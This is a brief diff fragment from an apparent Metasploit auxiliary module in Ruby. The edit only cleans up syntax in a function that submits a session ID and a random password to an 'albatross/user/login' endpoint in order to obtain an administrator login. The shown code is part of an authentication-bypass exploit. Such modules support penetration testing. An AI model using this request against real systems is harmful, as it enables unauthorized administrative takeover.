@@ -102,11 +102,11 @@ class MetasploitModule < Msf::Auxiliary
   def free_the_admin(session_id)
     # step 2: give the session ID to the server and have it grant us a free admin password
     post_data = Rex::MIME::Message.new
-    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
-    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, content_disposition = 'form-data; name="password"')
-    post_data.add_part('admin', nil, nil, content_disposition = 'form-data; name="username"')
-    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')
-    post_data.add_part(session_id, nil, nil, content_disposition = 'form-data; name="sessionId"')
+    post_data.add_part('', nil, nil, 'form-data; name="deviceid"')
+    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, 'form-data; name="password"')
+    post_data.add_part('admin', nil, nil, 'form-data; name="username"')
+    post_data.add_part('', nil, nil, 'form-data; name="clientDetails"')
+    post_data.add_part(session_id, nil, nil, 'form-data; name="sessionId"')
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),
